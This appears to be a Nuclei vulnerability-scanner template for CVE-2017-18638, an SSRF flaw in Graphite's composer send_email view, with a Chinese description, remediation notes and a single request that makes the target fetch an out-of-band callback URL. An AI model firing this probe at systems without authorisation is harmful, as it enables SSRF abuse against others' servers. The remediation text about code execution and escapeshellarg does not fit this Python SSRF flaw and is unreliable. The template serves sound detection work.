id: CVE-2017-18638
info:
  name: Graphite 'graphite.composer.views.send_email' SSRF
  author:
  - l0ne1y
  description: "Graphite 代码执行漏洞\n Graphite是一款基于Django的Web应用程序。该程序主要用于绘制图形和仪表板。\n\nGraphite
    1.1.5及之前版本中的send_email in graphite-web/webapp/graphite/composer/views.py文件存在代码问题漏洞。该漏洞源于网络系统或产品的代码开发过程中存在设计或实现不当的问题。 "
  severity: high
  remediation: |-
    官方修复方案：<br />1、升级系统至无漏洞版本，或于官网下载安全补丁。
    https://github.com/graphite-project/graphite-web/pull/2499

    临时修复方案：<br />1、在执行涉及到可以将字符串作为代码执行的函数时，需要严格验证用户传递的参数，同时尽量避免用户控制参数。<br />2、使用escapeshellarg函数处理相关参数。Escapeshellarg函数会将任何引起参数或命令结束的字符进行转义，如单引号“’”会被转义为“\\’”，双引号“””会被转义为“\\””，分号“;”会被转义为“\\;”，这样escapeshellarg会将参数内容限制在一对单引号或双引号里面，转义参数中所包含的单引号或双引号，使其无法对当前执行进行截断，实现防范命令注入攻击的目的。
requests:
- matchers:
  - type: word
    part: interactsh_protocol
    words:
    - http
  path:
  - '{{BaseURL}}/composer/send_email?to={{rand_text_alpha(4)}}@{{rand_text_alpha(4)}}&url=http://{{interactsh-url}}'
  method: GET
